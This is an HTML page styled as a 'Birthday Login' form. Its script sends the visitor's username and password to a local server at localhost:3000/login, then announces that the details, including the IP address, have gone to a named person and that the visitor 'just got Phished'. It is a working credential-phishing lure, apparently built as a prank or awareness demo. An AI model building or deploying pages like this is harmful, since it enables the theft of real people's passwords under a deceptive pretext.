<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Birthday Login</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to right, #f5af19, #f12711);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-box {
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
    }

    h2 {
      text-align: center;
      color: #f12711;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 12px;
      background: #f12711;
      color: white;
      border: none;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
    }

    button:hover {
      background: #c31432;
    }

    .msg {
      text-align: center;
      margin-top: 15px;
      font-weight: bold;
      color: #155724;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Login to Birthday Page</h2>
    <form id="loginForm">
      <input type="text" name="username" placeholder="Enter username/email" required />
      <input type="password" name="password" placeholder="Enter password" required />
      <button type="submit">Login</button>
    </form>
    <div class="msg" id="message"></div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const msg = document.getElementById('message');

    form.addEventListener('submit', async function (e) {
      e.preventDefault();

      const formData = new FormData(form);
      const data = Object.fromEntries(formData.entries());

      try {
        const response = await fetch('http://localhost:3000/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
        });

        const result = await response.json();

        // Show success message
        msg.textContent = 'Congrats! Your details including IP Address have been sent to Bobby B Wilfred. You just got Phished ðŸŽ‰';

        // Optionally clear form
        form.reset();
      } catch (error) {
        msg.textContent = 'Failed to send data.';
      }
    });
  </script>
</body>
</html>
